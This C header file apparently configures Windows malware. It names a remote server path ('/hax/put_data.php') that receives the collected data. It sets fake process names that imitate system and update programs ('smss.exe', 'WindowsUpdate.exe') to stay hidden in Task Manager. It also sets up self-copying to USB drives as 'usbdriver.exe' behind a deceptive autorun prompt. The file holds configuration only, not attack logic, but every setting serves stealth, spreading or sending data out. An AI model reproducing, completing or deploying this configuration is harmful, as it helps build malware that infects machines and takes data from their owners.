#pragma once

/* --------------------------------------------------------------------------*/
/* ----------------------------------SERVER----------------------------------*/
/* --------------------------------------------------------------------------*/

// Domain of your web server, e.g. example.org
#define V_NET_DOMAIN "einbaum.org"

// Subfolder where your files are located.
// Example 1:
//   Your put_data.php is in example.org/files/test/put_data.php
//   Variable value: "/files/test/"
// Example 2:
//   Your put_data.php is in example.org/put_data.php
//   Variable value: "/"
#define V_NET_BASE "/hax/"

// Don't change this (unless you've actually changed the name of put_data.php)
#define V_NET_FILE_DATA "put_data.php"


/* --------------------------------------------------------------------------*/
/* ----------------------------------CLIENT----------------------------------*/
/* --------------------------------------------------------------------------*/

// Random unique identifier used to prevent this program from starting twice
#define V_UNIQUE_ID _T("something_unique_1337")


// Fake executable names that might appear in task manager
#define V_FAKE_NAME1 _T("FlashUpdate.exe")
#define V_FAKE_NAME2 _T("smss.exe")
#define V_FAKE_NAME3 _T("WindowsUpdate.exe")

// Temporary files that might or might not be deleted.
#define V_FAKE_TMP1  _T("FLupdate_4x8c.tmp")
// Do not remove .exe
#define V_FAKE_TMP2  _T("FLupdate_4x8d.exe")


// File name when the program is copied to USB
#define V_FAKE_USB_FILE   _T("usbdriver.exe")
// Autorun dialog box title
#define V_FAKE_USB_LABEL  _T("Device")
// Autorun program name
#define V_FAKE_USB_ACTION _T("Open folder to view files")